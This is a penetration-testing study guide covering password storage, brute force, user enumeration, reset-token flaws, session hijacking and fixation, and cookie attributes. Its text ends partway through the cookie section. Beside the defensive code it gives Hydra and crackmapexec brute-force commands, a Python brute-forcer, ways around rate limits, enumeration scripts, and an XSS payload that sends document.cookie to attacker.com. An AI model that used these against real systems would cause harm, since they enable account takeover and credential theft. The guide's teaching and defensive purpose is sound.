
# Authentication & Session Management: The Gatekeepers

## Table of Contents

1. [Executive Summary & OSCP Relevance](#1-executive-summary--oscp-relevance)
2. [ABSOLUTE BEGINNER: Authentication & Sessions Explained](#2-absolute-beginner-authentication--sessions-explained)
3. [Password-Based Authentication](#3-password-based-authentication)
4. [Brute Force & Credential Attacks](#4-brute-force--credential-attacks)
5. [User Enumeration Techniques](#5-user-enumeration-techniques)
6. [Password Reset Vulnerabilities](#6-password-reset-vulnerabilities)
7. [Session Management Fundamentals](#7-session-management-fundamentals)
8. [Session Hijacking Attacks](#8-session-hijacking-attacks)
9. [Session Fixation Attacks](#9-session-fixation-attacks)
10. [Cookie Security Deep Dive](#10-cookie-security-deep-dive)
11. [JSON Web Tokens (JWT) - Complete Guide](#11-json-web-tokens-jwt---complete-guide)
12. [JWT Attack Techniques](#12-jwt-attack-techniques)
13. [OAuth 2.0 Vulnerabilities](#13-oauth-20-vulnerabilities)
14. [Multi-Factor Authentication (MFA) Bypasses](#14-multi-factor-authentication-mfa-bypasses)
15. [API Authentication Mechanisms](#15-api-authentication-mechanisms)
16. [SAML & SSO Attacks](#16-saml--sso-attacks)
17. [Automation & Tool Usage](#17-automation--tool-usage)
18. [OSCP Attack Scenarios](#18-oscp-attack-scenarios)
19. [Defense Strategies](#19-defense-strategies)
20. [Common Pitfalls](#20-common-pitfalls)
21. [Hands-on Exercises](#21-hands-on-exercises)
22. [Interview Questions](#22-interview-questions)
23. [Summary & Key Takeaways](#23-summary--key-takeaways)
24. [References & Further Reading](#24-references--further-reading)

---

## 1. Executive Summary & OSCP Relevance

### What is Authentication & Session Management?

If **Access Control** is the lock on the door, **Authentication** is the key, and **Session Management** is holding that key for the duration of your visit.

**Authentication (AuthN)**: Verifying who you are
- Passwords, biometrics, certificates, tokens

**Session Management**: Tracking your authenticated state across requests
- Cookies, tokens, session IDs

### OSCP Relevance (CRITICAL - 95%)

Authentication and session vulnerabilities are **guaranteed** on the OSCP exam. You will encounter:

**Common OSCP Scenarios**:
- Default credentials (admin:admin, root:password)
- Weak password brute forcing (Hydra, Burp Intruder)
- Session hijacking via XSS
- JWT token manipulation
- Password reset token predictability
- Cookie tampering

**Time Allocation**: 20-40 minutes per machine for authentication testing

### Why This Matters

```
Security Chain:
┌─────────────────────────────────────┐
│ 1. Authentication (Login)           │  ← If this breaks, game over
│ 2. Session Management (Stay logged) │  ← If this breaks, impersonation
│ 3. Authorization (What can you do)  │  ← Useless if #1 or #2 fails
│ 4. Business Logic                   │
└─────────────────────────────────────┘
```

**Statistics**:
- 81% of data breaches involve weak/stolen credentials (Verizon DBIR)
- Average cost of credential-based breach: $4.37M
- 65% of users reuse passwords across sites

---

## 2. ABSOLUTE BEGINNER: Authentication & Sessions Explained

### The Bank Analogy

**Authentication** = Showing your ID at the bank entrance
- Bank teller asks: "Who are you?"
- You show driver's license
- They verify it matches their records

**Session** = Getting a visitor badge for the day
- You don't show ID at every counter
- The badge proves you've been verified
- Badge expires at end of day

### The Problem with HTTP

HTTP is **stateless** — every request is independent.

```
Without Sessions:
┌─────────────────────────────────────────────────┐
│ User: "Show me my account balance"              │
│ Server: "Who are you? Please login again."      │
│                                                  │
│ User: [Logs in with username/password]          │
│ Server: "Your balance is $1000"                 │
│                                                  │
│ User: "Transfer $50 to Bob"                     │
│ Server: "Who are you? Please login again."      │  ← Annoying!
└─────────────────────────────────────────────────┘

With Sessions:
┌─────────────────────────────────────────────────┐
│ User: [Logs in with username/password]          │
│ Server: "OK. Here's your session cookie: abc123"│
│                                                  │
│ User: "Show my balance" (sends cookie: abc123)  │
│ Server: [Checks cookie] "You're Alice. $1000"   │
│                                                  │
│ User: "Transfer $50" (sends cookie: abc123)     │
│ Server: [Checks cookie] "Done. Alice → Bob $50" │
└─────────────────────────────────────────────────┘
```

### ASCII Visualization

```
┌────────────────────────────────────────────────────────────┐
│              Authentication & Session Flow                 │
└────────────────────────────────────────────────────────────┘

    User                    Server                  Database
     │                        │                        │
     │ 1. POST /login         │                        │
     │    username=alice      │                        │
     │    password=secret     │                        │
     │───────────────────────→│                        │
     │                        │                        │
     │                        │ 2. Query user          │
     │                        │───────────────────────→│
     │                        │                        │
     │                        │ 3. Return user record  │
     │                        │←───────────────────────│
     │                        │    (hashed password)   │
     │                        │                        │
     │                        │ 4. Verify hash         │
     │                        │    bcrypt.compare()    │
     │                        │    ✓ Match!            │
     │                        │                        │
     │                        │ 5. Create session      │
     │                        │───────────────────────→│
     │                        │    INSERT sessions     │
     │                        │    (user_id, token)    │
     │                        │                        │
     │ 6. Set-Cookie:         │                        │
     │    session=xyz789      │                        │
     │←───────────────────────│                        │
     │                        │                        │
     │ 7. GET /profile        │                        │
     │    Cookie: session=xyz │                        │
     │───────────────────────→│                        │
     │                        │                        │
     │                        │ 8. Validate session    │
     │                        │───────────────────────→│
     │                        │    SELECT user_id      │
     │                        │    FROM sessions       │
     │                        │    WHERE token=xyz     │
     │                        │                        │
     │ 9. Profile data        │                        │
     │←───────────────────────│                        │
```

---

## 3. Password-Based Authentication

### 3.1 How Passwords Should Work

**Secure Password Storage**:

```
User Registration:
1. User submits: password="MySecret123"
2. Server generates salt: "a1b2c3d4"
3. Server hashes: bcrypt("MySecret123" + "a1b2c3d4") = "$2a$12$abc..."
4. Server stores: username="alice", hash="$2a$12$abc...", salt="a1b2c3d4"

User Login:
1. User submits: password="MySecret123"
2. Server retrieves stored hash + salt for "alice"
3. Server hashes submitted password with same salt
4. Server compares: stored_hash == computed_hash
5. If match → authenticated
```

### 3.2 Insecure Password Storage (Vulnerable)

**Example 1: Plaintext (NEVER DO THIS)**:
```sql
CREATE TABLE users (
    username VARCHAR(50),
    password VARCHAR(50)  -- Plaintext!
);

INSERT INTO users VALUES ('alice', 'MySecret123');
```

**Attack**: SQL injection or database dump reveals all passwords instantly.

**Example 2: MD5/SHA1 (Weak)**:
```php
<?php
$password = $_POST['password'];
$hash = md5($password);  // Fast hash, no salt

// Store: INSERT INTO users (username, hash) VALUES ('alice', '$hash')
?>
```

**Attack**: Rainbow tables pre-compute hashes, instant password cracking.

**Example 3: Unsalted Bcrypt (Better but still weak)**:
```python
import bcrypt

password = "MySecret123"
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
# If same password used by multiple users, hashes will be identical
# Attacker can identify common passwords
```

### 3.3 Secure Implementation

**Python (Flask) with Bcrypt**:
```python
from flask import Flask, request, session
import bcrypt

app = Flask(__name__)
app.secret_key = "very-secret-key-change-in-production"

@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']
    
    # Generate salt and hash
    salt = bcrypt.gensalt(rounds=12)  # Cost factor: 2^12 iterations
    hashed = bcrypt.hashpw(password.encode(), salt)
    
    # Store in database
    db.execute(
        "INSERT INTO users (username, password_hash) VALUES (?, ?)",
        (username, hashed)
    )
    return "Registered successfully"

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Retrieve user from database
    user = db.execute(
        "SELECT id, password_hash FROM users WHERE username = ?",
        (username,)
    ).fetchone()
    
    if not user:
        return "Invalid credentials", 401
    
    # Verify password
    if bcrypt.checkpw(password.encode(), user['password_hash']):
        session['user_id'] = user['id']
        return "Login successful"
    
    return "Invalid credentials", 401
```

**Node.js with Argon2**:
```javascript
const argon2 = require('argon2');

// Registration
async function registerUser(username, password) {
    try {
        const hash = await argon2.hash(password, {
            type: argon2.argon2id,
            memoryCost: 2 ** 16,   // 64 MB
            timeCost: 3,           // Iterations
            parallelism: 1
        });
        
        await db.query(
            'INSERT INTO users (username, password_hash) VALUES ($1, $2)',
            [username, hash]
        );
    } catch (err) {
        console.error(err);
    }
}

// Login
async function loginUser(username, password) {
    const user = await db.query(
        'SELECT id, password_hash FROM users WHERE username = $1',
        [username]
    );
    
    if (user.rows.length === 0) {
        return null;  // User not found
    }
    
    try {
        if (await argon2.verify(user.rows[0].password_hash, password)) {
            return user.rows[0].id;  // Valid password
        }
    } catch (err) {
        console.error(err);
    }
    
    return null;  // Invalid password
}
```

### 3.4 Password Hash Comparison

| Algorithm | Speed (GPU) | Recommended | Notes |
|-----------|-------------|-------------|-------|
| **MD5** | 180 GH/s | ❌ NEVER | Designed for speed, broken collisions |
| **SHA1** | 95 GH/s | ❌ NEVER | Fast, deprecated |
| **SHA256** | 4 GH/s | ❌ No | Still too fast for passwords |
| **Bcrypt** | 100 H/s | ✅ Yes | Adaptive cost, well-tested |
| **Scrypt** | 50 H/s | ✅ Yes | Memory-hard |
| **Argon2** | 10 H/s | ✅✅ BEST | Winner of Password Hashing Competition |

**Why Speed Matters**:
```
MD5 (fast):
- Attacker can test 180 billion passwords per second
- Cracks 8-char password in minutes

Argon2 (slow):
- Attacker can test 10 passwords per second
- Cracks 8-char password in years/decades
```

---

## 4. Brute Force & Credential Attacks

### 4.1 Attack Types

#### A. Brute Force
Testing every possible combination.

```
Charset: lowercase (26 chars)
Length: 4 chars
Total combinations: 26^4 = 456,976

At 100 req/sec: ~76 minutes
At 1000 req/sec: ~8 minutes
```

**Example**:
```bash
# Generate all 4-char combinations
crunch 4 4 abcdefghijklmnopqrstuvwxyz > wordlist.txt

# Brute force with Hydra
hydra -l admin -P wordlist.txt http-post-form \
  "//login.php:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 16 -f
```

#### B. Dictionary Attack
Testing common passwords from a wordlist.

**Top 10 Most Common Passwords (2023)**:
1. 123456
2. password
3. 123456789
4. 12345678
5. 12345
6. qwerty
7. abc123
8. password1
9. 111111
10. 1234567890

**Attack**:
```bash
# Using rockyou.txt (14 million passwords)
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.100 -t 4
```

#### C. Credential Stuffing
Using username/password pairs from breached databases.

**Sources**:
- Collection #1 (773M accounts)
- LinkedIn breach (165M accounts)
- Adobe breach (150M accounts)
- Exploit.in collections

**Example**:
```bash
# Format: email:password
# alice@example.com:password123
# bob@example.com:letmein

# Use with credential stuffing tool
python3 credential_stuffer.py --target https://victim.com/login \
                               --credentials breached_passwords.txt
```

#### D. Password Spraying
Trying one password against many usernames (avoids account lockout).

```
Traditional Brute Force (gets locked out):
User: admin
Passwords: password1, password2, password3, ..., password1000
→ Account locked after 5 attempts

Password Spraying (avoids lockout):
Password: Summer2024!
Users: admin, alice, bob, charlie, ..., user1000
→ Each user gets only 1 attempt, no lockout
```

**Example**:
```bash
# Try "Password123!" against all users
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

### 4.2 Hydra - Complete Guide

**Basic Syntax**:
```bash
hydra [OPTIONS] [TARGET] [SERVICE]
```

**HTTP POST Form**:
```bash
# Identify form parameters
# Login form: <form method="POST" action="/login">
#   <input name="username">
#   <input name="password">
# Failed login shows: "Invalid credentials"

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" \
  -t 10 -f

# Flags:
# -l: single username
# -L: username list
# -p: single password
# -P: password list
# -t: threads
# -f: stop after finding first valid credential
```

**SSH**:
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
```

**FTP**:
```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.100
```

**HTTP Basic Auth**:
```bash
hydra -l admin -P rockyou.txt http-get://192.168.1.100/admin
```

**With Cookies**:
```bash
hydra -l admin -P passwords.txt \
  192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: session=abc123"
```

### 4.3 Burp Suite Intruder

**Step-by-Step**:

1. **Capture Login Request**
   ```http
   POST /login HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=test
   ```

2. **Send to Intruder** (Right-click → Send to Intruder)

3. **Configure Positions**
   ```
   username=admin&password=§test§
   ```
   Click "Add §" around the password value.

4. **Attack Type**: Sniper (one payload set)

5. **Load Payload**
   - Payloads → Payload Options → Load
   - Select wordlist (e.g., rockyou.txt)

6. **Grep - Match** (to identify success)
   - Options → Grep - Match
   - Add: "Welcome" or "Dashboard" (text that appears on successful login)

7. **Start Attack**
   - Analyze responses
   - Look for different status code or length
   - Check for Grep match

8. **Results**
   ```
   Payload     Status  Length  Grep
   test123     200     1234    
   admin       200     1234    
   password    302     567     ✓  ← Successful login (redirect)
   ```

### 4.4 Custom Python Brute Forcer

```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

TARGET = "https://target.com/login"
USERNAME = "admin"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

def try_password(password):
    """Attempt login with given password"""
    data = {
        'username': USERNAME,
        'password': password.strip()
    }
    
    try:
        r = requests.post(TARGET, data=data, timeout=5)
        
        # Detect successful login
        if "Welcome" in r.text or "Dashboard" in r.text:
            print(f"[+] SUCCESS! Password: {password}")
            return True
        elif r.status_code == 302:  # Redirect on success
            print(f"[+] SUCCESS! Password: {password}")
            return True
    except Exception as e:
        print(f"[!] Error: {e}")
    
    return False

def main():
    print(f"[*] Starting brute force attack on {TARGET}")
    print(f"[*] Username: {USERNAME}")
    
    with open(WORDLIST, 'r', encoding='latin-1') as f:
        passwords = f.readlines()[:1000]  # Test first 1000 passwords
    
    # Multithreaded attack (be careful with rate limiting!)
    with ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(try_password, passwords)
    
    if not any(results):
        print("[-] No valid password found")

if __name__ == "__main__":
    main()
```

### 4.5 Rate Limiting Bypass

**Problem**: Server blocks after 5 failed attempts.

**Bypasses**:

**A. IP Rotation**:
```bash
# Use proxychains with Tor
proxychains hydra -l admin -P passwords.txt target.com http-post-form "..."

# Rotate IPs with multiple proxies
# proxychains.conf:
# [ProxyList]
# socks5 127.0.0.1 9050
# socks5 192.168.1.100 1080
# socks5 10.0.0.5 1080
```

**B. Header Manipulation**:
```python
headers = {
    'X-Forwarded-For': '8.8.8.8',  # Spoof source IP
    'X-Originating-IP': '8.8.8.8',
    'X-Remote-IP': '8.8.8.8',
    'X-Remote-Addr': '8.8.8.8'
}

requests.post(TARGET, data=creds, headers=headers)
```

**C. Slow and Low**:
```bash
# 1 attempt per minute (avoids detection)
hydra -l admin -P passwords.txt -t 1 -w 60 target.com http-post-form "..."
```

**D. Distributed Attack**:
```bash
# Split wordlist across multiple machines
split -n 10 rockyou.txt wordlist_part_

# Machine 1: hydra ... -P wordlist_part_aa
# Machine 2: hydra ... -P wordlist_part_ab
# ...
```

---

## 5. User Enumeration Techniques

### 5.1 What is User Enumeration?

Identifying valid usernames allows targeted attacks (password spraying, credential stuffing).

### 5.2 Error Message Differences

**Vulnerable Application**:
```
Login with "alice:wrongpassword"
→ "Invalid password"

Login with "nonexistent:wrongpassword"
→ "Invalid username"
```

**Attack**:
```bash
# Test username
curl -X POST https://target.com/login \
  -d "username=alice&password=test" \
  | grep "Invalid password"  # If found, alice exists!

curl -X POST https://target.com/login \
  -d "username=bob&password=test" \
  | grep "Invalid username"  # Bob doesn't exist
```

**Secure Implementation** (generic error):
```
Login with any invalid credentials
→ "Invalid username or password"  (same message for both)
```

### 5.3 Timing Attacks

**Concept**: Valid username triggers password hashing (slow), invalid username returns immediately (fast).

**Vulnerable Code**:
```python
def login(username, password):
    user = db.query("SELECT * FROM users WHERE username = ?", username)
    
    if not user:
        return "Invalid credentials"  # Returns immediately (5ms)
    
    # Password hashing is slow
    if bcrypt.verify(password, user['password_hash']):  # Takes 100ms
        return "Success"
    else:
        return "Invalid credentials"
```

**Attack**:
```python
import requests
import time

def check_timing(username):
    start = time.time()
    requests.post('https://target.com/login', 
                  data={'username': username, 'password': 'wrongpassword'})
    elapsed = time.time() - start
    return elapsed

# Test known valid user
time_valid = check_timing('admin')  # 0.15 seconds

# Test unknown user
time_invalid = check_timing('randomuser123')  # 0.01 seconds

# If there's significant difference, timing leak exists
if time_valid > time_invalid * 5:
    print("Timing attack possible!")
```

**Automated Timing Attack**:
```python
#!/usr/bin/env python3
import requests
import time
import statistics

TARGET = "https://target.com/login"

def measure_response_time(username, iterations=10):
    """Measure average response time for a username"""
    times = []
    
    for _ in range(iterations):
        start = time.time()
        requests.post(TARGET, data={'username': username, 'password': 'wrongpass'})
        elapsed = time.time() - start
        times.append(elapsed)
    
    return statistics.mean(times)

# Test multiple usernames
usernames = ['admin', 'root', 'test', 'alice', 'bob', 'charlie']

results = {}
for user in usernames:
    avg_time = measure_response_time(user)
    results[user] = avg_time
    print(f"{user}: {avg_time:.3f}s")

# Find outliers (likely valid users)
mean = statistics.mean(results.values())
stdev = statistics.stdev(results.values())

print("\nLikely valid users:")
for user, time in results.items():
    if time > mean + stdev:
        print(f"  {user} ({time:.3f}s)")
```

**Defense**:
```python
def login(username, password):
    user = db.query("SELECT * FROM users WHERE username = ?", username)
    
    if not user:
        # Perform dummy bcrypt to equalize timing
        bcrypt.hashpw(b"dummy", bcrypt.gensalt())
        return "Invalid credentials"
    
    if bcrypt.verify(password, user['password_hash']):
        return "Success"
    else:
        return "Invalid credentials"
```

### 5.4 Registration Enumeration

**Vulnerable**:
```
Try to register with "alice@example.com"
→ "This email is already registered"

Try to register with "newuser@example.com"
→ "Registration successful"
```

**Attack**:
```bash
# Check if email exists
curl -X POST https://target.com/register \
  -d "email=victim@example.com&password=test123" \
  | grep "already registered"
```

### 5.5 Password Reset Enumeration

**Vulnerable**:
```
Request reset for "alice@example.com"
→ "Password reset email sent to alice@example.com"

Request reset for "nonexistent@example.com"
→ "No account found with this email"
```

**Secure**:
```
Request reset for any email
→ "If an account exists, a password reset email has been sent"
```

### 5.6 Username Enumeration via HTTP Status Codes

**Example**:
```bash
# Valid user
curl -I https://target.com/users/alice
HTTP/1.1 200 OK

# Invalid user
curl -I https://target.com/users/nonexistent
HTTP/1.1 404 Not Found
```

**Attack**:
```bash
# Enumerate valid usernames
for user in $(cat usernames.txt); do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/users/$user")
  if [ "$status" == "200" ]; then
    echo "Valid: $user"
  fi
done
```

---

## 6. Password Reset Vulnerabilities

### 6.1 Weak Token Generation

**Vulnerable Code** (predictable token):
```python
import time

def generate_reset_token(user_id):
    # INSECURE: Based on timestamp
    token = str(user_id) + str(int(time.time()))
    return token

# Example:
# User 5 requests reset at 1706112000
# Token: "51706112000"
# Attacker can predict: "61706112000", "71706112000", etc.
```

**Attack**:
```python
import time

# Victim requests reset at ~12:00:00
victim_user_id = 10
current_time = int(time.time())

# Try tokens from ±5 minutes
for offset in range(-300, 300):
    token = str(victim_user_id) + str(current_time + offset)
    r = requests.get(f"https://target.com/reset?token={token}")
    if "Reset your password" in r.text:
        print(f"Found valid token: {token}")
        break
```

**Secure Implementation**:
```python
import secrets

def generate_reset_token(user_id):
    # Cryptographically secure random token
    token = secrets.token_urlsafe(32)  # 256 bits of entropy
    
    # Store in database with expiration
    db.execute(
        "INSERT INTO reset_tokens (user_id, token, expires_at) VALUES (?, ?, ?)",
        (user_id, token, datetime.now() + timedelta(hours=1))
    )
    
    return token
```

### 6.2 Host Header Injection

**Attack Flow**:
```
1. Attacker requests password reset for victim@example.com
2. Attacker modifies Host header to evil.com
3. Server generates reset link: https://evil.com/reset?token=abc123
4. Server sends email to victim with poisoned link
5. Victim clicks link → Token sent to attacker's server
6. Attacker uses token to reset victim's password
```

**Vulnerable Code**:
```php
<?php
// Get host from HTTP header
$host = $_SERVER['HTTP_HOST'];  // Attacker can control this!

$reset_url = "https://$host/reset?token=$token";

mail($user_email, "Password Reset", "Click here: $reset_url");
?>
```

**Attack**:
```http
POST /forgot-password HTTP/1.1
Host: evil.com  ← Injected
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Email Sent**:
```
To: victim@example.com
Subject: Password Reset

Click here to reset your password:
https://evil.com/reset?token=abc123xyz
                    ↑ Attacker's domain!
```

**Defense**:
```python
# Hardcode trusted domain
TRUSTED_DOMAIN = "example.com"

def send_reset_email(user_email, token):
    reset_url = f"https://{TRUSTED_DOMAIN}/reset?token={token}"
    send_email(user_email, "Password Reset", f"Click here: {reset_url}")
```

### 6.3 Token Leakage via Referer

**Scenario**:
```
1. User clicks reset link: https://bank.com/reset?token=abc123
2. Reset page loads
3. Page contains external resource: <img src="https://cdn.example.com/logo.png">
4. Browser sends: 
   GET /logo.png HTTP/1.1
   Host: cdn.example.com
   Referer: https://bank.com/reset?token=abc123  ← Token leaked!
5. cdn.example.com logs the Referer (including token)
```

**Defense**:
```html
<!-- Prevent Referer leakage -->
<meta name="referrer" content="no-referrer">

<!-- Or use token in POST body, not URL -->
<form method="POST" action="/reset">
  <input type="hidden" name="token" value="abc123">
  <input type="password" name="new_password">
  <button>Reset Password</button>
</form>
```

### 6.4 Password Reset Poisoning (Advanced)

**Attack**:
```http
POST /forgot-password HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com

email=victim@example.com
```

**If server uses X-Forwarded-Host**:
```python
# Vulnerable
host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
reset_url = f"https://{host}/reset?token={token}"
```

**Result**: Same as Host header injection.

### 6.5 No Expiration / Reusable Tokens

**Vulnerable**:
```
1. User requests password reset → Token: abc123
2. User resets password using token
3. Token is NOT invalidated
4. Attacker finds old email, clicks link again
5. Token still works! Attacker resets password again
```

**Secure Implementation**:
```python
def reset_password(token, new_password):
    # Retrieve token from database
    reset = db.query(
        "SELECT user_id, expires_at, used FROM reset_tokens WHERE token = ?",
        (token,)
    ).fetchone()
    
    if not reset:
        return "Invalid token"
    
    if reset['used']:
        return "Token already used"
    
    if datetime.now() > reset['expires_at']:
        return "Token expired"
    
    # Mark token as used
    db.execute("UPDATE reset_tokens SET used = 1 WHERE token = ?", (token,))
    
    # Update password
    db.execute("UPDATE users SET password_hash = ? WHERE id = ?",
               (hash_password(new_password), reset['user_id']))
    
    return "Password reset successful"
```

---

## 7. Session Management Fundamentals

### 7.1 Server-Side Sessions (Stateful)

**How It Works**:
```
1. User logs in
2. Server creates session:
   - Generates random session ID: "abc123xyz"
   - Stores in database: sessions table
   - Stores user data: {user_id: 5, role: "user"}
3. Server sends cookie: Set-Cookie: session_id=abc123xyz
4. Subsequent requests include: Cookie: session_id=abc123xyz
5. Server looks up session in database
6. Server retrieves user data
```

**Database Schema**:
```sql
CREATE TABLE sessions (
    session_id VARCHAR(64) PRIMARY KEY,
    user_id INTEGER NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

**Implementation (Flask)**:
```python
from flask import Flask, session, request
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = authenticate(username, password)
    if user:
        # Create session
        session['user_id'] = user['id']
        session['username'] = user['username']
        session['role'] = user['role']
        return "Login successful"
    
    return "Invalid credentials", 401

@app.route('/profile')
def profile():
    if 'user_id' not in session:
        return "Unauthorized", 401
    
    return f"Welcome, {session['username']}"

@app.route('/logout')
def logout():
    session.clear()
    return "Logged out"
```

### 7.2 Client-Side Sessions (Stateless - JWT)

**How It Works**:
```
1. User logs in
2. Server creates JWT:
   - Header: {"alg": "HS256", "typ": "JWT"}
   - Payload: {"user_id": 5, "role": "user", "exp": 1706112000}
   - Signature: HMAC-SHA256(header + payload, secret_key)
3. Server sends: Authorization: Bearer eyJhbGci...
4. Subsequent requests include JWT in header
5. Server verifies signature (no database lookup!)
6. Server extracts user data from payload
```

**Advantages**:
- No database lookups (fast)
- Scalable (stateless)
- Works across microservices

**Disadvantages**:
- Cannot revoke (until expiration)
- Larger payload (sent with every request)
- Replay attacks if not secured

---

## 8. Session Hijacking Attacks

### 8.1 Via XSS (Cookie Theft)

**Attack**:
```javascript
// XSS payload
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**What Happens**:
```
1. Victim visits page with XSS
2. Payload executes in victim's browser
3. document.cookie = "session_id=abc123xyz"
4. Payload sends cookie to attacker's server
5. Attacker uses cookie: Cookie: session_id=abc123xyz
6. Attacker is now logged in as victim
```

**Defense**:
```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly: JavaScript cannot access document.cookie
Secure: Only sent over HTTPS
SameSite: Prevents CSRF
```

### 8.2 Via Network Sniffing (HTTP)

**Attack**:
```bash
# Attacker on same network (WiFi, LAN)
tcpdump -i wlan0 -A | grep "Cookie:"

# Captures:
# Cookie: session_id=abc123xyz
```

**Replay Attack**:
```bash
curl https://victim.com/account \
  -H "Cookie: session_id=abc123xyz"
```

**Defense**: Always use HTTPS (TLS encryption).

### 8.3 Via Session Sniffing (Burp)

**Scenario**: Attacker has access to victim's browser (shared computer, malware).

**Attack**:
```
1. Open DevTools → Application → Cookies
2. Copy session_id value
3. Use in attacker's browser or curl
```

**Defense**:
- Bind session to IP address (breaks mobile users)
- Bind session to User-Agent (can be spoofed)
- Use device fingerprinting
- Implement "Trusted Devices" feature

### 8.4 Session Hijacking via Predictable Session IDs

**Vulnerable** (PHP default settings):
```php
session_start();  // Default PHP session
// Session ID: PHPSESSID=1, 2, 3, 4, 5... (sequential)
```

**Attack**:
```bash
# Enumerate session IDs
for i in {1..1000}; do
  curl https://target.com/profile \
    -H "Cookie: PHPSESSID=$i" \
    -o session_$i.html
done

# Analyze responses to find valid sessions
grep "Welcome" session_*.html
```

**Secure**:
```python
import secrets

def generate_session_id():
    return secrets.token_urlsafe(32)  # 256 bits of entropy
```

---

## 9. Session Fixation Attacks

### 9.1 What is Session Fixation?

**Attack Flow**:
```
1. Attacker visits site, gets session: session_id=attacker123
2. Attacker sends link to victim: https://bank.com/login?session_id=attacker123
3. Victim clicks link, logs in
4. Server keeps session_id=attacker123 (doesn't regenerate!)
5. Attacker uses session_id=attacker123
6. Attacker is now logged in as victim
```

### 9.2 Attack Vectors

**A. URL Parameter**:
```
https://victim.com/login?SESSID=attacker_session_123
```

**B. Cookie Injection** (if attacker controls subdomain):
```javascript
// Attacker's site: evil.victim.com
document.cookie = "session_id=attacker123; domain=.victim.com";
// Cookie applies to all *.victim.com
```

**C. Meta Tag**:
```html
<meta http-equiv="Set-Cookie" content="session_id=attacker123">
```

### 9.3 Vulnerable Code

**PHP**:
```php
<?php
session_start();

// Accept session ID from URL parameter
if (isset($_GET['SESSID'])) {
    session_id($_GET['SESSID']);  // VULNERABLE!
    session_start();
}

// Login logic
if ($_POST['username'] && $_POST['password']) {
    // Authenticate user...
    $_SESSION['user_id'] = $user_id;
    // Session ID NOT regenerated! Still using attacker's ID
}
?>
```

### 9.4 Secure Implementation

**PHP**:
```php
<?php
session_start();

if ($_POST['username'] && $_POST['password']) {
    // Authenticate user...
    
    // CRITICAL: Regenerate session ID upon login
    session_regenerate_id(true);  // Delete old session
    
    $_SESSION['user_id'] = $user_id;
}
?>
```

**Python (Flask)**:
```python
from flask import session
import secrets

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    
    if user:
        # Regenerate session
        session.clear()
        session.permanent = True
        
        # Create new session data
        session['user_id'] = user['id']
        session['_csrf_token'] = secrets.token_hex(16)
        
        return "Login successful"
```

**Node.js (Express)**:
```javascript
app.post('/login', (req, res) => {
    authenticateUser(req.body.username, req.body.password, (err, user) => {
        if (user) {
            // Regenerate session
            req.session.regenerate((err) => {
                req.session.userId = user.id;
                req.session.role = user.role;
                res.send('Login successful');
            });
        }
    });
});
```

---

## 10. Cookie Security Deep Dive

### 10.1 Cookie Attributes

**Complete Cookie Example**:
```
Set-Cookie: session_id=abc123xyz; 
            Domain=.example.com; 
            Path=/; 
            Expires=Wed, 21 Oct 2026 07:28:00 GMT; 
            Max-Age=3600; 
            Secure; 
            HttpOnly; 
            SameSite=Strict
```

**Attribute Breakdown**:

| Attribute | Purpose | Security Impact |
|-----------|---------|-----------------|
| **HttpOnly** | Blocks JavaScript access | Prevents XSS cookie theft |
| **Secure** | HTTPS only | Prevents HTTP interception |
| **SameSite=Strict** | Same-origin only | Prevents CSRF |
| **SameSite=Lax** | Same-origin + top-level navigation | Prevents most CSRF |
| **Domain** | Cookie scope | Subdomain access control |
| **Path** | URL path scope | Path-based isolation |
| **Expires** | Absolute expiration | Session duration |
| **Max-Age** | Relative expiration (seconds) | Session duration |

### 10.2 HttpOnly Flag

**Without HttpOnly** (vulnerable):
```javascript
// XSS payload can steal cookie
document.cookie  // "session_id=abc123xyz"
fetch('https://attacker.com/steal?c=' + document.cookie);
```

**With HttpOnly** (secure):
```javascript
document.cookie  // "" (HttpOnly cookies hidden)
// XSS cannot steal session cookie!
```

**Setting HttpOnly**:
```python
# Flask
response.set_cookie('session_id', 'abc123', httponly=True)

# Express.js
res.cookie('session_id', 'abc123', { httpOnly: true });

# PHP
setcookie('session_id', 'abc123', [
    'httponly' => true
]);
```

### 10.3 Secure Flag

**Purpose**: Only send cookie over HTTPS.

**Attack Scenario (without Secure flag)**:
```
1. User visits https://bank.com (secure)
2. Logs in, gets cookie: session_id=abc123
3. User clicks link to http://bank.com/promo (HTTP!)
4. Browser sends: Cookie: session_id=abc123 (over unencrypted HTTP)
5. Attacker sniffs network, steals cookie
```

**With Secure Flag**:
```
Cookie only sent over HTTPS
HTTP request → No cookie sent
```

### 10.4 SameSite Attribute

**SameSite=Strict**:
```
Cookie sent ONLY if request originates from same site

Scenario:
- User on evil.com clicks link to bank.com
- Cookie NOT sent (different site)
- Prevents CSRF completely

Downside:
- Breaks legitimate cross-site navigation
- User clicks bank link in email → must login again
```

**SameSite=Lax** (default in modern browsers):
```
Cookie sent on top-level navigation (GET only)

Scenario:
